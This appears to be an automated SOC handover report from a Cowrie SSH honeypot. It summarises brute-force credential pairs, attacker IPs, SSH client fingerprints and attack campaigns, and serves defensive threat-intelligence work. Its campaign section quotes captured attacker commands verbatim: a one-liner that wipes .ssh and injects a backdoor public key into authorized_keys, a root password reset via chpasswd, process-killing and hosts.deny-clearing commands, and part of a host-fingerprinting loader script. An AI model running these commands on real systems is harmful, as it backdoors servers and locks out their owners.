# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-09-21 |
| **Generated At** | 2026-09-21T19:11:31Z |
| **Shift Time** | 19:11 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **338** |
| Confirmed Threats | **319** |
| False Positives Filtered | **19** (5.6%) |
| Unique Attacker IPs | **94** |
| Countries of Origin | **35** |
| High Severity Cases | **146** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **192** |
| Malware Samples Analyzed | **5** HIGH · **22** MED · 16 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **315** |
| Unique Credential Pairs | **244** |
| Unique Usernames | **29** |
| Unique Passwords | **219** |
| Successful Auth Pairs | **296** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 222 |
| `345gs5662d34` | 32 |
| `support` | 9 |
| `ubnt` | 6 |
| `admin` | 3 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 32 |
| `3245gs5662d34` | 32 |
| `support` | 9 |
| `1234` | 8 |
| `123456` | 3 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 32 |
| `root` | `3245gs5662d34` | 14 |
| `support` | `support` | 9 |
| `ubnt` | `1234` | 6 |
| `root` | `` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `ubnt` | `1234` | `77.90.185.17` | 2026-09-21T12:56:09 |
| `root` | `Fuckyou.2017` | `10.0.0.73` | 2026-09-21T12:57:06 |
| `ubnt` | `1234` | `10.0.0.73` | 2026-09-21T12:57:55 |
| `root` | `@dm!n` | `10.0.0.73` | 2026-09-21T12:59:22 |
| `root` | `@dmini$tratoR` | `10.0.0.73` | 2026-09-21T13:01:35 |
| `root` | `@dmin2012` | `10.0.0.73` | 2026-09-21T13:03:46 |
| `ubnt` | `1234` | `80.94.95.118` | 2026-09-21T13:04:02 |
| `root` | `@dmin123456` | `10.0.0.73` | 2026-09-21T13:06:04 |
| `support` | `support` | `10.0.0.73` | 2026-09-21T13:07:33 |
| `root` | `dgf` | `10.0.0.73` | 2026-09-21T13:08:19 |
| `root` | `Data123a` | `10.0.0.73` | 2026-09-21T13:12:54 |
| `root` | `Data@123` | `10.0.0.73` | 2026-09-21T13:15:09 |
| `root` | `Asdf12345` | `10.0.0.73` | 2026-09-21T13:17:24 |
| `root` | `asdf@123` | `10.0.0.73` | 2026-09-21T13:19:40 |
| `root` | `asd19` | `10.0.0.73` | 2026-09-21T13:21:53 |
| `root` | `asd123@` | `10.0.0.73` | 2026-09-21T13:24:08 |
| `root` | `!asapsa7!` | `10.0.0.73` | 2026-09-21T13:26:19 |
| `root` | `As123456789` | `10.0.0.73` | 2026-09-21T13:28:35 |
| `root` | `Adm!n` | `10.0.0.73` | 2026-09-21T13:30:48 |
| `root` | `adminroot@123` | `10.0.0.73` | 2026-09-21T13:33:06 |
| `root` | `Adminroot@123` | `10.0.0.73` | 2026-09-21T13:35:23 |
| `root` | `122122122` | `103.200.25.198` | 2026-09-21T13:36:38 |
| `345gs5662d34` | `345gs5662d34` | `103.200.25.198` | 2026-09-21T13:36:44 |
| `root` | `3245gs5662d34` | `103.200.25.198` | 2026-09-21T13:36:47 |
| `root` | `admin!23` | `10.0.0.73` | 2026-09-21T13:37:35 |
| `agus` | `agus` | `10.0.0.73` | 2026-09-21T13:38:07 |
| `345gs5662d34` | `345gs5662d34` | `10.0.0.73` | 2026-09-21T13:38:10 |
| `agus` | `3245gs5662d34` | `10.0.0.73` | 2026-09-21T13:38:11 |
| `root` | `admin.2016` | `10.0.0.73` | 2026-09-21T13:39:50 |
| `root` | `yang123456` | `101.47.156.21` | 2026-09-21T13:39:58 |
| `345gs5662d34` | `345gs5662d34` | `101.47.156.21` | 2026-09-21T13:40:02 |
| `root` | `3245gs5662d34` | `101.47.156.21` | 2026-09-21T13:40:04 |
| `root` | `admin_2015` | `10.0.0.73` | 2026-09-21T13:42:07 |
| `luis` | `Luis123!` | `115.178.75.242` | 2026-09-21T13:42:31 |
| `345gs5662d34` | `345gs5662d34` | `115.178.75.242` | 2026-09-21T13:42:34 |
| `luis` | `3245gs5662d34` | `115.178.75.242` | 2026-09-21T13:42:36 |
| `root` | `Admin_2012` | `10.0.0.73` | 2026-09-21T13:44:22 |
| `root` | `admin` | `138.2.235.147` | 2026-09-21T13:46:37 |
| `root` | `Admin@2010` | `10.0.0.73` | 2026-09-21T13:46:37 |
| `ftp` | `ftp` | `116.125.120.27` | 2026-09-21T13:47:39 |
| `345gs5662d34` | `345gs5662d34` | `116.125.120.27` | 2026-09-21T13:47:43 |
| `ftp` | `3245gs5662d34` | `116.125.120.27` | 2026-09-21T13:47:44 |
| `root` | `Qwer@2025` | `139.255.254.163` | 2026-09-21T13:48:49 |
| `root` | `admin2008` | `10.0.0.73` | 2026-09-21T13:48:52 |
| `345gs5662d34` | `345gs5662d34` | `139.255.254.163` | 2026-09-21T13:48:54 |
| `root` | `3245gs5662d34` | `139.255.254.163` | 2026-09-21T13:48:56 |
| `infra` | `infra123` | `140.246.137.102` | 2026-09-21T13:49:41 |
| `root` | `abcd@1234A` | `10.0.0.73` | 2026-09-21T13:51:06 |
| `root` | `p@ck3tf3nc3` | `80.102.218.187` | 2026-09-21T13:51:46 |
| `345gs5662d34` | `345gs5662d34` | `80.102.218.187` | 2026-09-21T13:51:49 |
| `root` | `3245gs5662d34` | `80.102.218.187` | 2026-09-21T13:51:50 |
| `pool` | `123456` | `118.145.237.236` | 2026-09-21T13:52:28 |
| `root` | `ABcd12345` | `10.0.0.73` | 2026-09-21T13:53:26 |
| `root` | `*abcd1234#` | `10.0.0.73` | 2026-09-21T13:55:38 |
| `root` | `abcd123` | `10.0.0.73` | 2026-09-21T13:57:52 |
| `root` | `abcd` | `10.0.0.73` | 2026-09-21T14:00:06 |
| `root` | `Abc123Abc123` | `10.0.0.73` | 2026-09-21T14:02:22 |
| `root` | `abc1234.` | `10.0.0.73` | 2026-09-21T14:04:35 |
| `root` | `abc!1234` | `10.0.0.73` | 2026-09-21T14:06:50 |
| `root` | `Abc123!@#` | `10.0.0.73` | 2026-09-21T14:09:03 |
| `root` | `abc@1` | `10.0.0.73` | 2026-09-21T14:11:15 |
| `root` | `abc` | `10.0.0.73` | 2026-09-21T14:13:25 |
| `root` | `AaBbCc123` | `10.0.0.73` | 2026-09-21T14:15:35 |
| `root` | `AaAa1!` | `10.0.0.73` | 2026-09-21T14:17:46 |
| `chaos` | `chaos123` | `101.47.155.9` | 2026-09-21T14:19:14 |
| `345gs5662d34` | `345gs5662d34` | `101.47.155.9` | 2026-09-21T14:19:18 |
| `chaos` | `3245gs5662d34` | `101.47.155.9` | 2026-09-21T14:19:21 |
| `root` | `aaa111!!!` | `10.0.0.73` | 2026-09-21T14:20:00 |
| `root` | `Aa136455` | `10.0.0.73` | 2026-09-21T14:22:13 |
| `watchdog` | `watchdog` | `10.0.0.73` | 2026-09-21T14:22:22 |
| `watchdog` | `3245gs5662d34` | `10.0.0.73` | 2026-09-21T14:22:25 |
| `root` | `Phoenix1` | `39.170.108.144` | 2026-09-21T14:22:37 |
| `345gs5662d34` | `345gs5662d34` | `39.170.108.144` | 2026-09-21T14:22:41 |
| `root` | `3245gs5662d34` | `39.170.108.144` | 2026-09-21T14:22:42 |
| `admin` | `123qwe123` | `14.103.83.214` | 2026-09-21T14:23:08 |
| `345gs5662d34` | `345gs5662d34` | `14.103.83.214` | 2026-09-21T14:23:12 |
| `admin` | `3245gs5662d34` | `14.103.83.214` | 2026-09-21T14:23:13 |
| `marcela` | `marcela` | `10.0.0.73` | 2026-09-21T14:24:23 |
| `root` | `A2@IRAN` | `10.0.0.73` | 2026-09-21T14:24:30 |
| `root` | `521521` | `49.207.244.133` | 2026-09-21T14:24:57 |
| `root` | `A1b2c3` | `10.0.0.73` | 2026-09-21T14:26:45 |
| `marcela` | `3245gs5662d34` | `10.0.0.73` | 2026-09-21T14:27:29 |
| `root` | `a1A` | `10.0.0.73` | 2026-09-21T14:28:59 |
| `root` | `4rfv$RFV` | `10.0.0.73` | 2026-09-21T14:31:13 |
| `user` | `1234!@#$` | `146.190.175.10` | 2026-09-21T14:31:40 |
| `345gs5662d34` | `345gs5662d34` | `146.190.175.10` | 2026-09-21T14:31:42 |
| `user` | `3245gs5662d34` | `146.190.175.10` | 2026-09-21T14:31:42 |
| `root` | `2wsxcde#` | `10.0.0.73` | 2026-09-21T14:33:27 |
| `root` | `000000` | `193.32.162.84` | 2026-09-21T14:34:40 |
| `root` | `29nov93` | `10.0.0.73` | 2026-09-21T14:35:45 |
| `root` | `111111` | `193.32.162.84` | 2026-09-21T14:37:54 |
| `root` | `29f91962` | `10.0.0.73` | 2026-09-21T14:37:59 |
| `root` | `200295s` | `10.0.0.73` | 2026-09-21T14:40:15 |
| `root` | `1w9k9r6` | `10.0.0.73` | 2026-09-21T14:42:27 |
| `root` | `1q!Q` | `10.0.0.73` | 2026-09-21T14:44:44 |
| `root` | `1qazxsw2` | `10.0.0.73` | 2026-09-21T14:47:05 |
| `root` | `1qazxsW@` | `10.0.0.73` | 2026-09-21T14:49:24 |
| `root` | `1qazxsw&)))` | `10.0.0.73` | 2026-09-21T14:51:37 |
| `ict` | `ict123` | `43.134.49.202` | 2026-09-21T14:52:09 |
| `345gs5662d34` | `345gs5662d34` | `43.134.49.202` | 2026-09-21T14:52:18 |
| `ict` | `3245gs5662d34` | `43.134.49.202` | 2026-09-21T14:52:20 |
| `root` | `1qazxsw!@` | `10.0.0.73` | 2026-09-21T14:53:55 |
| `root` | `1qazxsw!)` | `10.0.0.73` | 2026-09-21T14:56:10 |
| `production` | `password` | `150.223.20.12` | 2026-09-21T14:57:17 |
| `345gs5662d34` | `345gs5662d34` | `150.223.20.12` | 2026-09-21T14:57:21 |
| `production` | `3245gs5662d34` | `150.223.20.12` | 2026-09-21T14:57:25 |
| `root` | `1qaz2wsx!QAZ@WSX` | `10.0.0.73` | 2026-09-21T14:58:22 |
| `root` | `123Qwerty` | `10.0.0.73` | 2026-09-21T15:00:47 |
| `root` | `!@#123qweasdzxc` | `10.0.0.73` | 2026-09-21T15:03:00 |
| `root` | `123qwe123` | `10.0.0.73` | 2026-09-21T15:05:17 |
| `root` | `123ABCabc` | `10.0.0.73` | 2026-09-21T15:07:33 |
| `root` | `1234zx` | `10.0.0.73` | 2026-09-21T15:09:47 |
| `root` | `1234qwer!@#\$` | `10.0.0.73` | 2026-09-21T15:11:57 |
| `root` | `1234qwer-` | `10.0.0.73` | 2026-09-21T15:14:04 |
| `root` | `1234abcd1234` | `10.0.0.73` | 2026-09-21T15:16:11 |
| `root` | `12345Qwert` | `10.0.0.73` | 2026-09-21T15:18:21 |
| `root` | `12345qwert` | `10.0.0.73` | 2026-09-21T15:20:28 |
| `root` | `12345Qw` | `10.0.0.73` | 2026-09-21T15:22:35 |
| `root` | `12345admin` | `10.0.0.73` | 2026-09-21T15:24:43 |
| `root` | `123456As` | `10.0.0.73` | 2026-09-21T15:26:56 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `118.194.249.72` | 2026-09-21T15:28:34 |
| `b'\x05\x04\x00\x01\x02\x80\x05\x01\x00\x03'` | `github.com PGET / HTTP/1.0` | `118.194.249.72` | 2026-09-21T15:28:53 |
| `root` | `12345690xc` | `10.0.0.73` | 2026-09-21T15:29:13 |
| `root` | `12345678a` | `10.0.0.73` | 2026-09-21T15:31:30 |
| `root` | `123456789abcde` | `10.0.0.73` | 2026-09-21T15:33:45 |
| `root` | `123456789aA` | `10.0.0.73` | 2026-09-21T15:36:07 |
| `root` | `123321@` | `10.0.0.73` | 2026-09-21T15:40:41 |
| `root` | `!@#` | `10.0.0.73` | 2026-09-21T15:42:59 |
| `root` | `zzxxcc1@#` | `10.0.0.73` | 2026-09-21T15:45:16 |
| `root` | `zzxxcc!@#` | `10.0.0.73` | 2026-09-21T15:47:35 |
| `root` | `zygi` | `10.0.0.73` | 2026-09-21T15:49:53 |
| `roots` | `roots` | `103.70.40.36` | 2026-09-21T15:51:39 |
| `345gs5662d34` | `345gs5662d34` | `103.70.40.36` | 2026-09-21T15:51:49 |
| `roots` | `3245gs5662d34` | `103.70.40.36` | 2026-09-21T15:51:58 |
| `root` | `zybyrf` | `10.0.0.73` | 2026-09-21T15:52:16 |
| `root` | `Zxcvbnm123` | `10.0.0.73` | 2026-09-21T15:54:35 |
| `root` | `zxc13051973` | `10.0.0.73` | 2026-09-21T15:56:49 |
| `root` | `ZAQ!xsw2` | `10.0.0.73` | 2026-09-21T15:59:05 |
| `root` | `z@123` | `10.0.0.73` | 2026-09-21T16:01:27 |
| `root` | `` | `10.0.0.73` | 2026-09-21T16:03:23 |
| `root` | `` | `77.90.185.17` | 2026-09-21T16:03:40 |
| `root` | `xzsawq21` | `10.0.0.73` | 2026-09-21T16:03:46 |
| `root` | `Welcome@9` | `10.0.0.73` | 2026-09-21T16:06:05 |
| `root` | `welcome23` | `10.0.0.73` | 2026-09-21T16:08:18 |
| `root` | `welcome@2013` | `10.0.0.73` | 2026-09-21T16:10:36 |
| `root` | `welcome@2012` | `10.0.0.73` | 2026-09-21T16:12:58 |
| `root` | `welcome@1234` | `10.0.0.73` | 2026-09-21T16:15:15 |
| `root` | `welcome.123` | `10.0.0.73` | 2026-09-21T16:17:27 |
| `root` | `@welcome123` | `10.0.0.73` | 2026-09-21T16:19:51 |
| `root` | `welcome@12` | `10.0.0.73` | 2026-09-21T16:22:08 |
| `janus` | `janus` | `49.229.102.187` | 2026-09-21T16:25:49 |
| `345gs5662d34` | `345gs5662d34` | `49.229.102.187` | 2026-09-21T16:25:55 |
| `janus` | `3245gs5662d34` | `49.229.102.187` | 2026-09-21T16:25:59 |
| `root` | `welcome@007` | `10.0.0.73` | 2026-09-21T16:26:41 |
| `support` | `support` | `182.181.217.37` | 2026-09-21T16:28:40 |
| `root` | `Welcome@000` | `10.0.0.73` | 2026-09-21T16:28:58 |
| `root` | `$upport` | `10.0.0.73` | 2026-09-21T16:31:21 |
| `root` | `$ummer1234` | `10.0.0.73` | 2026-09-21T16:33:39 |
| `root` | `Ultim@t3` | `10.0.0.73` | 2026-09-21T16:36:03 |
| `root` | `ultimate` | `10.0.0.73` | 2026-09-21T16:38:15 |
| `root` | `Tiger1` | `10.0.0.73` | 2026-09-21T16:40:29 |
| `root` | `Tiger123` | `10.0.0.73` | 2026-09-21T16:45:07 |
| `root` | `Tiger!1` | `10.0.0.73` | 2026-09-21T16:47:19 |
| `root` | `Tiger!12` | `10.0.0.73` | 2026-09-21T16:49:39 |
| `timemachine` | `timemachine` | `209.99.190.113` | 2026-09-21T16:49:39 |
| `345gs5662d34` | `345gs5662d34` | `209.99.190.113` | 2026-09-21T16:49:41 |
| `timemachine` | `3245gs5662d34` | `209.99.190.113` | 2026-09-21T16:49:42 |
| `webadmin` | `webadmin1` | `103.151.140.79` | 2026-09-21T16:51:22 |
| `345gs5662d34` | `345gs5662d34` | `103.151.140.79` | 2026-09-21T16:51:32 |
| `webadmin` | `3245gs5662d34` | `103.151.140.79` | 2026-09-21T16:51:38 |
| `root` | `Tiger!123` | `10.0.0.73` | 2026-09-21T16:51:57 |
| `support` | `support` | `176.53.159.196` | 2026-09-21T16:52:53 |
| `root` | `Tiger!1234` | `10.0.0.73` | 2026-09-21T16:54:14 |
| `root` | `Tiger@1` | `10.0.0.73` | 2026-09-21T16:56:32 |
| `elasticsearch` | `1` | `80.102.218.187` | 2026-09-21T16:56:33 |
| `elasticsearch` | `3245gs5662d34` | `80.102.218.187` | 2026-09-21T16:56:36 |
| `root` | `bert` | `62.212.70.129` | 2026-09-21T16:58:12 |
| `345gs5662d34` | `345gs5662d34` | `62.212.70.129` | 2026-09-21T16:58:14 |
| `root` | `3245gs5662d34` | `62.212.70.129` | 2026-09-21T16:58:15 |
| `root` | `Tiger@12` | `10.0.0.73` | 2026-09-21T16:58:44 |
| `root` | `Tiger@123` | `10.0.0.73` | 2026-09-21T17:01:01 |
| `root` | `2103` | `14.225.206.171` | 2026-09-21T17:03:17 |
| `345gs5662d34` | `345gs5662d34` | `14.225.206.171` | 2026-09-21T17:03:22 |
| `root` | `3245gs5662d34` | `14.225.206.171` | 2026-09-21T17:03:24 |
| `root` | `Tiger.1` | `10.0.0.73` | 2026-09-21T17:03:25 |
| `root` | `Password@` | `180.93.144.27` | 2026-09-21T17:05:23 |
| `345gs5662d34` | `345gs5662d34` | `180.93.144.27` | 2026-09-21T17:05:28 |
| `root` | `3245gs5662d34` | `180.93.144.27` | 2026-09-21T17:05:30 |
| `root` | `Tiger..2` | `10.0.0.73` | 2026-09-21T17:05:42 |
| `dinesh` | `dinesh@123` | `186.248.197.77` | 2026-09-21T17:05:55 |
| `345gs5662d34` | `345gs5662d34` | `186.248.197.77` | 2026-09-21T17:05:58 |
| `dinesh` | `3245gs5662d34` | `186.248.197.77` | 2026-09-21T17:05:59 |
| `root` | `1` | `2.57.122.209` | 2026-09-21T17:06:58 |
| `root` | `Tiger...3` | `10.0.0.73` | 2026-09-21T17:07:58 |
| `root` | `12` | `2.57.122.209` | 2026-09-21T17:09:58 |
| `root` | `Tiger..12` | `10.0.0.73` | 2026-09-21T17:10:26 |
| `root` | `123` | `2.57.122.209` | 2026-09-21T17:12:15 |
| `root` | `Tiger...123` | `10.0.0.73` | 2026-09-21T17:12:39 |
| `root` | `Thomas@123` | `10.0.0.73` | 2026-09-21T17:15:02 |
| `root` | `1234` | `2.57.122.209` | 2026-09-21T17:15:08 |
| `root` | `12345` | `2.57.122.209` | 2026-09-21T17:16:37 |
| `root` | `thomas@123` | `10.0.0.73` | 2026-09-21T17:17:19 |
| `root` | `1qaz!qaz` | `190.5.200.98` | 2026-09-21T17:18:29 |
| `345gs5662d34` | `345gs5662d34` | `190.5.200.98` | 2026-09-21T17:18:31 |
| `root` | `3245gs5662d34` | `190.5.200.98` | 2026-09-21T17:18:31 |
| `root` | `1234567` | `2.57.122.209` | 2026-09-21T17:19:28 |
| `root` | `12345678` | `2.57.122.209` | 2026-09-21T17:20:46 |
| `root` | `Test14` | `10.0.0.73` | 2026-09-21T17:21:57 |
| `root` | `123456789` | `2.57.122.209` | 2026-09-21T17:22:08 |
| `root` | `1234567890` | `2.57.122.209` | 2026-09-21T17:23:26 |
| `root` | `test@12345` | `10.0.0.73` | 2026-09-21T17:24:17 |
| `root` | `123qwe` | `2.57.122.209` | 2026-09-21T17:24:48 |
| `root` | `123qwerty` | `2.57.122.209` | 2026-09-21T17:26:08 |
| `root` | `test123` | `10.0.0.73` | 2026-09-21T17:26:35 |
| `root` | `21` | `2.57.122.209` | 2026-09-21T17:27:29 |
| `root` | `test1` | `10.0.0.73` | 2026-09-21T17:28:46 |
| `root` | `321` | `2.57.122.209` | 2026-09-21T17:28:53 |
| `root` | `4321` | `2.57.122.209` | 2026-09-21T17:30:17 |
| `root` | `temp@2015` | `10.0.0.73` | 2026-09-21T17:31:03 |
| `root` | `54321` | `2.57.122.209` | 2026-09-21T17:31:39 |
| `root` | `654321` | `2.57.122.209` | 2026-09-21T17:32:58 |
| `root` | `temp@124` | `10.0.0.73` | 2026-09-21T17:33:20 |
| `root` | `P4ssw0rd` | `2.57.122.209` | 2026-09-21T17:34:15 |
| `root` | `P4ssword` | `2.57.122.209` | 2026-09-21T17:35:31 |
| `root` | `P@ssw0rd` | `2.57.122.209` | 2026-09-21T17:37:54 |
| `root` | `tech@!23` | `10.0.0.73` | 2026-09-21T17:37:58 |
| `root` | `Passw0rd` | `2.57.122.209` | 2026-09-21T17:39:07 |
| `root` | `System123?` | `10.0.0.73` | 2026-09-21T17:40:09 |
| `root` | `p4ssword` | `2.57.122.209` | 2026-09-21T17:40:11 |
| `root` | `p@ssw0rd` | `2.57.122.209` | 2026-09-21T17:41:19 |
| `root` | `1qaz@WSX123!@#` | `217.154.38.181` | 2026-09-21T17:42:24 |
| `345gs5662d34` | `345gs5662d34` | `217.154.38.181` | 2026-09-21T17:42:26 |
| `root` | `3245gs5662d34` | `217.154.38.181` | 2026-09-21T17:42:27 |
| `root` | `@Support3` | `10.0.0.73` | 2026-09-21T17:42:28 |
| `root` | `passw0rd` | `2.57.122.209` | 2026-09-21T17:43:21 |
| `root` | `password` | `2.57.122.209` | 2026-09-21T17:45:11 |
| `root` | `qwerty` | `2.57.122.209` | 2026-09-21T17:45:53 |
| `root` | `1qaz@WSX123!@#` | `46.188.119.26` | 2026-09-21T17:46:19 |
| `345gs5662d34` | `345gs5662d34` | `46.188.119.26` | 2026-09-21T17:46:22 |
| `root` | `3245gs5662d34` | `46.188.119.26` | 2026-09-21T17:46:23 |
| `root` | `QAZWSXEDC` | `183.251.230.98` | 2026-09-21T17:46:44 |
| `345gs5662d34` | `345gs5662d34` | `183.251.230.98` | 2026-09-21T17:46:49 |
| `root` | `3245gs5662d34` | `183.251.230.98` | 2026-09-21T17:46:51 |
| `root` | `@Support1` | `10.0.0.73` | 2026-09-21T17:46:54 |
| `root` | `support4321` | `10.0.0.73` | 2026-09-21T17:49:08 |
| `root` | `145236` | `163.7.11.155` | 2026-09-21T17:49:19 |
| `345gs5662d34` | `345gs5662d34` | `163.7.11.155` | 2026-09-21T17:49:25 |
| `root` | `3245gs5662d34` | `163.7.11.155` | 2026-09-21T17:49:29 |
| `root` | `sony2012` | `10.0.0.73` | 2026-09-21T17:51:34 |
| `root` | `sonyericson` | `10.0.0.73` | 2026-09-21T17:53:52 |
| `root` | `S0ny123` | `10.0.0.73` | 2026-09-21T17:58:43 |
| `root` | `Sony1` | `10.0.0.73` | 2026-09-21T18:01:02 |
| `root` | `Sony12` | `10.0.0.73` | 2026-09-21T18:03:26 |
| `root` | `Sony!@#` | `10.0.0.73` | 2026-09-21T18:05:50 |
| `root` | `Sony!` | `10.0.0.73` | 2026-09-21T18:08:10 |
| `root` | `server@2013` | `10.0.0.73` | 2026-09-21T18:12:42 |
| `root` | `123` | `2.57.122.150` | 2026-09-21T18:15:48 |
| `ubuntu` | `hello` | `51.91.96.79` | 2026-09-21T18:16:30 |
| `345gs5662d34` | `345gs5662d34` | `51.91.96.79` | 2026-09-21T18:16:32 |
| `ubuntu` | `3245gs5662d34` | `51.91.96.79` | 2026-09-21T18:16:33 |
| `root` | `Server1234` | `10.0.0.73` | 2026-09-21T18:17:22 |
| `root` | `1234` | `2.57.122.150` | 2026-09-21T18:17:57 |
| `root` | `server@1234` | `10.0.0.73` | 2026-09-21T18:19:41 |
| `root` | `12345` | `2.57.122.150` | 2026-09-21T18:19:52 |
| `myuser` | `123456789` | `65.109.206.127` | 2026-09-21T18:19:58 |
| `345gs5662d34` | `345gs5662d34` | `65.109.206.127` | 2026-09-21T18:20:00 |
| `myuser` | `3245gs5662d34` | `65.109.206.127` | 2026-09-21T18:20:01 |
| `root` | `@server123` | `10.0.0.73` | 2026-09-21T18:21:55 |
| `root` | `1234567` | `2.57.122.150` | 2026-09-21T18:23:33 |
| `root` | `Server1` | `10.0.0.73` | 2026-09-21T18:24:16 |
| `root` | `12345678` | `2.57.122.150` | 2026-09-21T18:24:47 |
| `root` | `123456789` | `2.57.122.150` | 2026-09-21T18:26:11 |
| `root` | `1234567890` | `2.57.122.150` | 2026-09-21T18:27:27 |
| `root` | `samsung2008` | `10.0.0.73` | 2026-09-21T18:28:45 |
| `admin` | `admin` | `176.65.134.121` | 2026-09-21T18:29:38 |
| `root` | `samsung123.` | `10.0.0.73` | 2026-09-21T18:31:03 |
| `root` | `sample123` | `10.0.0.73` | 2026-09-21T18:33:31 |
| `root` | `123abc` | `2.57.122.150` | 2026-09-21T18:35:32 |
| `root` | `1q2w3e4r` | `2.57.122.150` | 2026-09-21T18:35:35 |
| `root` | `P@ssw0rd123` | `2.57.122.150` | 2026-09-21T18:35:42 |
| `root` | `R@123456` | `10.0.0.73` | 2026-09-21T18:35:44 |
| `root` | `Qxzs7952` | `10.0.0.73` | 2026-09-21T18:38:04 |
| `root` | `qwerty32923` | `10.0.0.73` | 2026-09-21T18:40:23 |
| `root` | `Qwerty2016` | `10.0.0.73` | 2026-09-21T18:42:24 |
| `root` | `Qwerty2012` | `10.0.0.73` | 2026-09-21T18:44:25 |
| `GET / HTTP/1.0` | `Host: 129.80.119.236` | `104.250.52.93` | 2026-09-21T18:45:40 |
| `USER test` | `USER test` | `104.250.52.93` | 2026-09-21T18:45:53 |
| `OPTIONS rtsp://129.80.119.236 RTSP/1.0` | `CSeq:1` | `104.250.52.93` | 2026-09-21T18:45:57 |
| `root` | `Qwerty123456` | `10.0.0.73` | 2026-09-21T18:46:25 |
| `root` | `qwerty.123456` | `10.0.0.73` | 2026-09-21T18:48:31 |
| `root` | `qwerty:1234` | `10.0.0.73` | 2026-09-21T18:50:30 |
| `root` | `P@ssw0rd@2025` | `147.15.20.173` | 2026-09-21T18:50:52 |
| `345gs5662d34` | `345gs5662d34` | `147.15.20.173` | 2026-09-21T18:50:55 |
| `root` | `3245gs5662d34` | `147.15.20.173` | 2026-09-21T18:50:56 |
| `root` | `qwerty123!!` | `10.0.0.73` | 2026-09-21T18:52:30 |
| `root` | `Qwerty%%%` | `10.0.0.73` | 2026-09-21T18:54:32 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **338** |
| Sessions with Fingerprint | **15** |
| Unique HASSH Fingerprints | **15** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 107 |
| Go SSH scanner | 45 |
| OpenSSH | 12 |
| Unknown | 2 |
| PuTTY | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 102 | 33 |
| `2ec37a7cc8da...` | Mirai/variant | 39 | 3 |
| `390ffe68a68c...` | Modern SSH client | 6 | 2 |
| `eff4c24daffc...` | Modern SSH client | 3 | 1 |
| `bc9e7273cde2...` | Mirai/variant | 2 | 2 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 102 | 33 | Mirai/variant |
| `2ec37a7cc8da...` | Go SSH scanner | 39 | 3 | Mirai/variant |
| `390ffe68a68c...` | OpenSSH | 6 | 2 | Modern SSH client |
| `95420f9d932d...` | OpenSSH | 4 | 4 | — |
| `eff4c24daffc...` | Go SSH scanner | 3 | 1 | Modern SSH client |
| `bc9e7273cde2...` | OpenSSH | 2 | 2 | Mirai/variant |
| `e37f354a101a...` | libssh | 2 | 2 | Mirai/variant |
| `03a80b21afa8...` | libssh | 2 | 1 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **8** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **Recon Loader Script** | 🟡 MEDIUM | 37 | 3 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 30 | 29 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:XX0WpP2i3Bl4"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `49.207.244.133`

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
